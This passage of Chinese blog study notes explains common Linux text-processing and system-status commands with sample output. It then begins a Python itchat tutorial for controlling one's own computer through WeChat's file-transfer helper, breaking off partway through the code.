<p>Linux中的文本文件处理命令的特点：</p>
<ul>
<li>不指定处理对象文件名时，从标准输入获得数据</li>
<li>指定处理对象文件名时。从文件中获取数据</li>
<li>多数命令可以指定多个文件，常结合shell的文件通配符使用</li>
<li>处理结果在标准输出显示</li>
</ul>
<p>常用的文本文件处理命令有：</p>
<ul>
<li>more/less：逐屏显示文件内容</li>
<li>cat、od：列出文件内容</li>
<li>head、tail：显示文件的头部、尾部</li>
<li>tee：三通</li>
<li>wc：字计数</li>
<li>sort：排序</li>
<li>tr：翻译字符（替换字符）</li>
<li>uniq：筛选重复行</li>
</ul>
<h4 id="more与less"><a href="#more与less" class="headerlink" title="more与less"></a>more与less</h4><p>more使用方法举例：</p>
<ul>
<li><code>more shudu.c</code> 指定一个文件</li>
<li><code>more *.[ch]</code> 指定多个文件</li>
<li><code>ls -l | more</code> 不指定文件，从标准输入获取，这里利用管道把<code>ls -l</code>的标准输出重定向到<code>more</code>的标准输入</li>
</ul>
<p>输出满屏后，在more中使用的指令：</p>
<ul>
<li>空格 显示下一屏</li>
<li>回车 向上滚一行，也就是把下一行滚动上来</li>
<li>q quit，退出程序</li>
<li>/pattern 根据正则表达式搜索字符串</li>
<li>/ 继续查找要搜索的字符串</li>
<li>h help，帮助信息</li>
<li>Ctrl+L 屏幕刷新</li>
</ul>
<p>less命令用法与more类似，增强的功能有：</p>
<ul>
<li>使用键盘的上下方向键，或者j，k键来滚动一行</li>
<li>用PgUp和PgDn按键翻页</li>
<li>用Home键翻到第一页，或者用End键翻到最后一页</li>
</ul>
<p>more和less都可以同时处理多个文件</p>
<h4 id="cat与od"><a href="#cat与od" class="headerlink" title="cat与od"></a>cat与od</h4><p>cat命名来源于英文concatenate——串结，查字典查到意思是“把 （一系列事件、事情等）联系起来”。这个命令用于打印文件内容，选项-n可以显示行号。</p>
<p>od octal dump 逐字节打印。常用选项有：</p>
<ul>
<li>-c 按照字符打印，如果这个字节为ascii码就显示为对应的字符，字符如果不可打印就显示为八进制码</li>
<li>-t c 同-c选项</li>
<li>-t x1 每一字节不可见字符显示为十六进制码</li>
<li>-t d1 每一字节不可见字符显示为十进制码</li>
<li>-t u1 每一字节不可见字符显示为无符号的十进制码</li>
</ul>
<p>cat和od命令都可以同时处理多个文件</p>
<h4 id="head与tail"><a href="#head与tail" class="headerlink" title="head与tail"></a>head与tail</h4><p>head显示文件内容前10行，tail显示文件内容最后10行，-n选项可以指定显示的行数。</p>
<p>一些用法：</p>
<ul>
<li><code>head -n 15 ab.c</code> 显示文件ab.c的前15行</li>
<li><code>head -n -20 msg.c</code>  除了文件msg.c尾部20行，显示其余部分</li>
<li><code>tail -n +20 msg.c</code> 除了文件msg.c头部20行，显示其余部分</li>
<li><code>tail -f debug.txt</code> 实时打印文件尾部被追加的内容</li>
</ul>
<p>head和tail命令都可以同时处理多个文件</p>
<h4 id="tee"><a href="#tee" class="headerlink" title="tee"></a>tee</h4><p>tee命令将从标准输入得到的数据抄送到标准输出显示，与此同时，把数据存入磁盘文件中，也可以同时写入多个文件。</p>
<p>用法举例：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">vim</span> <span class="token number">1</span>.txt <span class="token operator">|</span> <span class="token function">tee</span> /dev/pts/1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>/dev/pts/1</code>是一个终端设备文件，这条命令使用vim编辑文件1.txt，并同时显示在<code>/dev/pts/1</code>终端的屏幕上。</p>
<h4 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h4><p>wc命令的功能主要是统计文件行数，单词数，字符数。</p>
<p>文件shudu.c有240行，576个单词，5264个字符：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">wc</span> shudu.c 
 <span class="token number">240</span>  <span class="token number">576</span> <span class="token number">5264</span> shudu.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>使用选项-l，只列出行数：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">wc</span> -l shudu.c
<span class="token number">240</span> shudu.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>当同时处理多个文件的时候，还列出一个合计：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">wc</span> shudu.c arg.c 
 <span class="token number">240</span>  <span class="token number">576</span> <span class="token number">5264</span> shudu.c
   <span class="token number">9</span>   <span class="token number">24</span>  <span class="token number">153</span> arg.c
 <span class="token number">249</span>  <span class="token number">600</span> <span class="token number">5417</span> total<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>结合管道和ps命令，查看系统所有进程的个数</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">wc</span> -l
<span class="token number">166</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>


<h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p>sort命令按照字符串排序，每一行为一个字符串，默认为升序。</p>
<p>文件test.txt内容是：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cat</span> test.txt 
aasd
zxcaw
<span class="token number">456</span>
<span class="token number">1234</span>
as<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用sort排序：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sort</span> test.txt   
<span class="token number">1234</span>
<span class="token number">456</span>
aasd
as
zxcaw<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用-n选项，对数字按照算术值大小排序，而不是按照字符串比较规则排序。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sort</span> test.txt -n
aasd
as
zxcaw
<span class="token number">456</span>
<span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>更多选项可以用man命令查看</p>
<h4 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h4><p>基本用法：<code>tr string1 string2</code> 把标准输入拷贝到标准输出，string1中出现的字符替换为string2中的对应字符。</p>
<p>把前面提到的test.txt文件中的字符转换成大写：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cat</span> test.txt <span class="token operator">|</span> <span class="token function">tr</span> axcwdzs <span class="token string">'AXCWDZS'</span>
AASD
ZXCAW
<span class="token number">456</span>
<span class="token number">1234</span>
AS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>或者直接使用[]指定一个集合：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cat</span> test.txt <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'[a-z]'</span> <span class="token string">'[A-Z]'</span>
AASD
ZXCAW
<span class="token number">456</span>
<span class="token number">1234</span>
AS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以用<code>\</code>加一个八进制数值来表示一个字符，下面是把字符<code>1</code>换成换行符（<code>\012</code>）</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cat</span> test.txt <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'1'</span> <span class="token string">'\012'</span>    
aasd
zxcaw
<span class="token number">456</span>

<span class="token number">234</span>
as<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h4 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h4><p>uniq命令用与筛选文件中重复的行，重复的行是指<strong>连续的</strong>、<strong>相同的</strong>行。</p>
<p>与大部分命令不同，这个命令最多指定两个文件，第一个文件为输入文件，第二个文件为输出文件。</p>
<p>现有name.txt文件，内容如下：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cat</span> name.txt 
feather
feather
Lee
lee
feather
Linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不带选项运行uniq命令，打印没有重复的行和有重复的行，重复的行只打印一次</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">uniq</span> name.txt 
feather
Lee
lee
feather
Linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用-u （uniqe）选项，打印没有重复的行</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">uniq</span> -u name.txt 
Lee
lee
feather
Linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用-d （duplicated）选项，打印有重复的行，重复的行只打印一次</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">uniq</span> -d name.txt
feather<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>使用-c选项，统计每行的重复次数</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">uniq</span> -c name.txt  
      <span class="token number">2</span> feather
      <span class="token number">1</span> Lee
      <span class="token number">1</span> lee
      <span class="token number">1</span> feather
      <span class="token number">1</span> Linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>注意</strong>：重复的行是指<strong>连续的</strong>、<strong>相同的</strong>行</p>
]]></content>
      <categories>
        <category>MOOC课程学习·Linux开发环境及应用</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux开发环境及应用·第一周·开始使用Linux（三）</title>
    <url>/ac82b932/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>学习使用几个常用命令来了解系统的状态</p>
<span id="more"></span>

<h3 id="了解系统状态"><a href="#了解系统状态" class="headerlink" title="了解系统状态"></a>了解系统状态</h3><h4 id="who"><a href="#who" class="headerlink" title="who"></a>who</h4><p>who命令用于列出当前已登入系统的用户，如下：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">who</span>
feather  tty7         <span class="token number">2019</span>-02-01 <span class="token number">12</span>:23 <span class="token punctuation">(</span>:0<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>第一列：用户名</li>
<li>第二列：终端设备的设备文件名，设备文件一般位于目录/dev下</li>
</ul>
<p>命令<code>who am i</code> 列出当前终端上的登录用户，我的系统貌似不行</p>
<h4 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h4><p>whoami命令仅仅列出当前终端上的登录用户</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">whoami</span>
feather<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="tty"><a href="#tty" class="headerlink" title="tty"></a>tty</h4><p>tty命令打印当前终端的设备文件名</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">tty</span>
/dev/pts/0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="uptime"><a href="#uptime" class="headerlink" title="uptime"></a>uptime</h4><p>uptime命令打印系统已开机的时间</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">uptime</span>
 <span class="token number">20</span>:22:40 up  <span class="token number">7</span>:59,  <span class="token number">1</span> user,  load average: <span class="token number">1.62</span>, <span class="token number">1.43</span>, <span class="token number">1.54</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li><code>20:22:40</code> 当前时间</li>
<li><code>up  7:59</code> 系统已经开机的时间</li>
<li><code>1 user</code> 当前登入系统的用户数</li>
<li><code>load average: 1.62, 1.43, 1.54</code> 近期1分钟，5分钟，15分钟内系统CPU的负载平均调度队列长度</li>
</ul>
<h4 id="top"><a href="#top" class="headerlink" title="top"></a>top</h4><p>top命令列出资源占用排名靠前的进程</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">top</span> - <span class="token number">20</span>:29:37 up  <span class="token number">8</span>:06,  <span class="token number">1</span> user,  load average: <span class="token number">1.33</span>, <span class="token number">1.35</span>, <span class="token number">1.46</span>
Tasks: <span class="token number">165</span> total,   <span class="token number">3</span> running, <span class="token number">162</span> sleeping,   <span class="token number">0</span> stopped,   <span class="token number">0</span> zombie
%Cpu0  <span class="token builtin class-name">:</span> <span class="token number">38.9</span> us, <span class="token number">11.1</span> sy,  <span class="token number">0.0</span> ni, <span class="token number">50.0</span> id,  <span class="token number">0.0</span> wa,  <span class="token number">0.0</span> hi,  <span class="token number">0.0</span> si,  <span class="token number">0.0</span> st
%Cpu1  <span class="token builtin class-name">:</span> <span class="token number">50.0</span> us, <span class="token number">11.1</span> sy,  <span class="token number">0.0</span> ni, <span class="token number">38.9</span> id,  <span class="token number">0.0</span> wa,  <span class="token number">0.0</span> hi,  <span class="token number">0.0</span> si,  <span class="token number">0.0</span> st
KiB Mem <span class="token builtin class-name">:</span>  <span class="token number">1778508</span> total,   <span class="token number">229804</span> free,   <span class="token number">847668</span> used,   <span class="token number">701036</span> buff/cache
KiB Swap:  <span class="token number">5242876</span> total,  <span class="token number">4300428</span> free,   <span class="token number">942448</span> used.   <span class="token number">611412</span> avail Mem 

  PID <span class="token environment constant">USER</span>      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>第一行和uptime命令的输出是类似的</li>
<li>Tasks 系统的任务信息</li>
<li>%Cpu cpu的占用率</li>
<li>top命令最下面列出一张进程表，比较重要的信息有：<ul>
<li>VIRT 进程逻辑地址空间大小（virtual），不断增大有可能是内存泄漏</li>
<li>RES 驻留内存数（Resident），即占用物理内存数</li>
<li>SHR 与其它进程共享的内存数（share）</li>
<li>%CPU 占用CPU百分比</li>
<li>%MEM 占用内存百分比</li>
<li>TIME+ 占用的CPU时间</li>
</ul>
</li>
</ul>
<h4 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h4><p>ps命令用于查阅进程状态（process status）</p>
<p>无选项运行ps命令，只列出当前终端上启动的进程</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ps</span>
  PID TTY          TIME CMD
<span class="token number">10691</span> pts/0    00:00:01 <span class="token function">zsh</span>
<span class="token number">12044</span> pts/0    00:00:00 <span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>e选项，列出系统中所有的进程：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ps</span> -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>f选项，以full格式列出每一个进程</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ps</span> -f
<span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMD
feather  <span class="token number">10691</span> <span class="token number">10687</span>  <span class="token number">0</span> <span class="token number">19</span>:27 pts/0    00:00:01 <span class="token function">zsh</span>
feather  <span class="token number">12090</span> <span class="token number">10691</span>  <span class="token number">0</span> <span class="token number">20</span>:39 pts/0    00:00:00 <span class="token function">ps</span> -f
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>l选项，以long格式列出每一个进程</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ps</span> -l
F S   <span class="token environment constant">UID</span>   PID  <span class="token environment constant">PPID</span>  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD
<span class="token number">0</span> S  <span class="token number">1000</span> <span class="token number">10691</span> <span class="token number">10687</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> -  <span class="token number">4137</span> -      pts/0    00:00:01 <span class="token function">zsh</span>
<span class="token number">0</span> R  <span class="token number">1000</span> <span class="token number">12085</span> <span class="token number">10691</span>  <span class="token number">0</span>  <span class="token number">80</span>   <span class="token number">0</span> -  <span class="token number">3923</span> -      pts/0    00:00:00 <span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>常见信息：</p>
<ul>
<li>UID：用户ID</li>
<li>PID：进程ID</li>
<li>PPID：父进程的PID</li>
<li>C：CPU占用指数，最近一段时间（秒级别）进程占用CPU的情况</li>
<li>STIME：进程的启动时间</li>
<li>SZ：进程逻辑内存大小（Size）</li>
<li>TTY：启动进程终端的名字</li>
<li>COMMAND（CMD）：启动进程的命令名</li>
<li>WCHAN：进程在内核的何处睡眠（Wait Channel）</li>
<li>TIME：累计执行时间，不占用CPU的时间不计入</li>
<li>PRI：优先级</li>
<li>S：状态，S=&gt;Sleep，R=&gt;Run，Z=&gt;Zombie（僵尸）</li>
</ul>
<h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p>free命令用来了解内存使用情况，单位是KB</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">free</span>
              total        used        <span class="token function">free</span>      shared  buff/cache   available
Mem:        <span class="token number">1778508</span>      <span class="token number">868072</span>      <span class="token number">211360</span>      <span class="token number">159220</span>      <span class="token number">699076</span>      <span class="token number">593808</span>
Swap:       <span class="token number">5242876</span>      <span class="token number">942448</span>     <span class="token number">4300428</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>buff/cache：Linux为提高效率，利用程序暂时不用的内存，缓冲读写过的磁盘信息</p>
<p>available：加上释放可用的buffers/cache，系统实际可利用的内存</p>
<h4 id="vmstat"><a href="#vmstat" class="headerlink" title="vmstat"></a>vmstat</h4><p>vmstat了解系统负载</p>
<p>每隔1秒打印一行信息：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">vmstat</span> <span class="token number">1</span>
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   <span class="token function">free</span>   buff  cache   si   so    bi    bo   <span class="token keyword">in</span>   cs us sy <span class="token function">id</span> wa st
 <span class="token number">6</span>  <span class="token number">0</span> <span class="token number">942448</span> <span class="token number">181600</span>  <span class="token number">89104</span> <span class="token number">614040</span>    <span class="token number">4</span>   <span class="token number">20</span>   <span class="token number">142</span>   <span class="token number">155</span>  <span class="token number">620</span>  <span class="token number">641</span> <span class="token number">12</span>  <span class="token number">5</span> <span class="token number">81</span>  <span class="token number">2</span>  <span class="token number">0</span>
 <span class="token number">0</span>  <span class="token number">0</span> <span class="token number">942448</span> <span class="token number">188876</span>  <span class="token number">89104</span> <span class="token number">611288</span>    <span class="token number">0</span>    <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">0</span> <span class="token number">3095</span> <span class="token number">5923</span> <span class="token number">21</span> <span class="token number">10</span> <span class="token number">69</span>  <span class="token number">0</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中的信息有：</p>
<ul>
<li>procs：r=&gt;等待运行的进程数，b=&gt;处在非中断睡眠状态的进程数</li>
<li>memory：free=&gt;空闲的内存，buff/cache=&gt;用做缓存的内存数</li>
<li>swap：磁盘/内存的交换页数量</li>
<li>io：块设备I/O块数，单位：块/秒</li>
<li>system： <ul>
<li>in=&gt;每秒的硬件中断数（interrupt），包括时钟中断</li>
<li>cs=&gt;每秒的环境切换次数（context switch）</li>
</ul>
</li>
<li>cpu：cpu的总使用率 us=&gt;user，sy=&gt;system，id=&gt;idle，wa=&gt;wait for disk I/O</li>
</ul>
]]></content>
      <categories>
        <category>MOOC课程学习·Linux开发环境及应用</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>python小项目之微信远程控制</title>
    <url>/3ca79d2c/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>前两天接触了一个有趣的python模块——itchat，这个模块可以非常方便的操作微信，今天就来使用这个模块来实现微信远程控制。<span id="more"></span></p>
<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>itchat模块不是python标准模块（内置模块），是一个第三方模块，需要下载安装，我们可以在命令行中输入如下命令安装：</p>
<pre class="line-numbers language-none"><code class="language-none">&gt; pip install itchat --user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>注意</strong>：pip工具是安装python时连带安装的，不清楚的可以回去看前面环境搭建的教程，或者评论提问。</p>
<p>安装完后，尝试导入模块</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> itchat
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>没有报错，表明安装成功！</p>
<h3 id="itchat"><a href="#itchat" class="headerlink" title="itchat"></a>itchat</h3><p>现在来简单介绍itchat的用法，仅仅是简单了解，为实战做铺垫，如果需要详细学习itchat可以问问度娘。</p>
<p>下面这个简单的例子几乎囊括了我们要用到itchat的功能</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itchat  <span class="token comment"># 导入itchat模块</span>

<span class="token decorator annotation punctuation">@itchat<span class="token punctuation">.</span>msg_register</span><span class="token punctuation">(</span><span class="token string">'Text'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">simple</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    src <span class="token operator">=</span> msg<span class="token punctuation">[</span><span class="token string">'FromUserName'</span><span class="token punctuation">]</span>  <span class="token comment"># 消息的发送方</span>
    dst <span class="token operator">=</span> msg<span class="token punctuation">[</span><span class="token string">'ToUserName'</span><span class="token punctuation">]</span>  <span class="token comment"># 消息的接受方</span>

    text <span class="token operator">=</span> msg<span class="token punctuation">[</span><span class="token string">'Text'</span><span class="token punctuation">]</span>  <span class="token comment"># 文本消息</span>
    
    <span class="token comment"># 字符串可以用+号拼接到一起 </span>
    send_msg <span class="token operator">=</span> <span class="token string">'从'</span><span class="token operator">+</span>src<span class="token operator">+</span><span class="token string">'到'</span><span class="token operator">+</span>dst<span class="token operator">+</span><span class="token string">':'</span> <span class="token operator">+</span> text

    <span class="token comment"># 发送消息给文件传输助手，消息内容为字符串send_msg</span>
    itchat<span class="token punctuation">.</span>send<span class="token punctuation">(</span>send_msg<span class="token punctuation">,</span> <span class="token string">'filehelper'</span><span class="token punctuation">)</span>  

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    itchat<span class="token punctuation">.</span>auto_login<span class="token punctuation">(</span><span class="token punctuation">)</span>
    itchat<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>很多地方看注释就可以懂，但还是有必要解释一下一些我们没接触过的东西。</p>
<h4 id="name"><a href="#name" class="headerlink" title="__name__"></a><code>__name__</code></h4><p>首先是，<code>__name__</code>这个变量。</p>
<p>当文件被当作模块导入的时候，也就是被import的时候，在这个文件中，这个<code>__name__</code>变量就是这个文件的名字（不包括后缀<code>.py</code>），而当这个文件被当作程序直接运行的时候，也就是运行<code>python 文件名.py</code>的时候，这个变量的值为<code>__main__</code>，所以<code>if __name__ == &#39;__main__&#39;:</code>的意思是，当文件被执行的时候，运行if后的代码块。</p>
<p>为什么会有这样的做法？</p>
<p>python的很多模块很多是可以直接当作程序运行的，一般运行的代码是测试什么的，使用这样的写法可以区分当前模块是作为程序运行，还是作为模块被导入。</p>
<p>而我在这里这么写，只是把这个if代码块当作程序的入口，看起来更清晰罢了。</p>
<h4 id="消息处理"><a href="#消息处理" class="headerlink" title="消息处理"></a>消息处理</h4><p>先忽略上面的函数定义，直接从if代码块入手。</p>
<p>运行<code>itchat.auto_login()</code>，不久之后弹出一个二维码，使用手机微信扫描二维码，并确认登录，程序就完成了微信的登录。</p>
<p>然后的<code>itchat.run()</code>里面是一个无限循环（可以在命令行按下<kbd>Ctrl</kbd>+<kbd>C</kbd>强制结束程序），每当微信有消息的时候，itchat就会调用已注册的消息处理函数来处理对应的消息。</p>
<p>这个消息处理函数就是我们前面定义的simple函数，这个函数带有一个装饰器<code>@itchat.msg_register(&#39;Text&#39;)</code>，这个装饰器就是把simple函数注册成消息处理函数，参数<code>Text</code>表示只处理文本消息。</p>
<p>也就是说，每当有文本消息时，itchat.run()里面的代码就会调用simple函数，并传入一个参数msg，这个msg其实是一个字典，包含了这则文本消息的发送方id（FromUserName），接受方id（ToUserName），消息内容（Text）等。</p>
<h4 id="发送消息"><a href="#发送消息" class="headerlink" title="发送消息"></a>发送消息</h4><p>我们可以通过itchat.send函数，发送消息，这个函数要用到两个参数，第一个是消息的内容，字符串类型；第二个参数是接受方id（这并不是微信昵称），<code>filehelper</code>是一个特殊的id，它指的是微信的文件传输助手（登录后，手机会话窗会出现），就是下图这个东东：<br><img src="/images/3ca79d2c/filehelper.jpg" alt="微信文件传输助手"></p>
<p><code>(⊙ˍ⊙)</code> 我的是英文的，不要介意。不过英文也不是filehelper，这我就不知道了，反正中文显示的应该是“文件传输助手”。</p>
<p>我们的项目就是用手机发送命令给这个文件传输助手，让程序跟据不同的命令来操作电脑。</p>
<hr>
<h3 id="开始工作"><a href="#开始工作" class="headerlink" title="开始工作"></a>开始工作</h3><p>我们创建先一个目录，目录名字就叫做<code>WeChatController</code>，当然，同学们可以起别的名字。这个目录下面存放的就是我们的python代码。</p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>介绍一下程序的基本流程：我们设定一些特定的消息内容做为指令，程序接受到发往消息助手的指令的时候，根据不同的指令做出不同的操作，比如发送消息内容为<code>help</code>，然后我们的程序把帮助信息发回消息助手。</p>
<p>用图可以这样表示：<br><img src="/images/3ca79d2c/run.png" alt="流程"></p>
<h4 id="开始编写代码"><a href="#开始编写代码" class="headerlink" title="开始编写代码"></a>开始编写代码</h4><p>现在开始编写我们的代码，在我们创建目录下新建一个文件命名为<code>main.py</code>（其它名字也可以）。</p>
<p>先写好程序的基本框架：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itchat

<span class="token decorator annotation punctuation">@itchat<span class="token punctuation">.</span>msg_register</span><span class="token punctuation">(</span><span class="token string">'Text'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">handler</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    dst <span class="token operator">=</span> msg<span class="token punctuation">[</span><span class="token string">'ToUserName'</span><span class="token punctuation">]</span>  <span class="token comment"># 消息接受方</span>
    text <span class="token operator">=</span> msg<span class="token punctuation">[</span><span class="token string">'Text'</span><span class="token punctuation">]</span>
    
    <span class="token keyword">if</span> dst <span class="token operator">==</span> <span class="token string">'filehelper'</span><span class="token punctuation">:</span>
        <span class="token comment"># 发往消息助手的消息就是我们的命令</span>
        <span class="token keyword">pass</span>  
    
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    itchat<span class="token punctuation">.</span>auto_login<span class="token punctuation">(</span><span class="token punctuation">)</span>
    itchat<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们只需要一个消息处理函数，就是这个handler，变量text就是我们的消息内容，也是我们的指令，我们根据不同的指令实现不同的操作，下面来实现帮助指令，收到这个指令，程序就把帮助信息发到文件助手，我们就可以在手机上看到了。</p>
<h5 id="实现帮助指令"><a href="#实现帮助指令" class="headerlink" title="实现帮助指令"></a>实现帮助指令</h5><p>我们把帮助指令的名字命名为<code>help</code>，我们只需要判断收到的消息text是否为字符串<code>&#39;help&#39;</code>即可，核心代码如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>略<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
    <span class="token keyword">if</span> dst <span class="token operator">==</span> <span class="token string">'filehelper'</span><span class="token punctuation">:</span>
        <span class="token comment"># 发往消息助手的消息就是我们的命令</span>
        <span class="token keyword">if</span> text <span class="token operator">==</span> <span class="token string">'help'</span><span class="token punctuation">:</span>
            help_msg <span class="token operator">=</span> <span class="token string">'现在支持的命令有:\n help 获取帮助信息\n'</span>
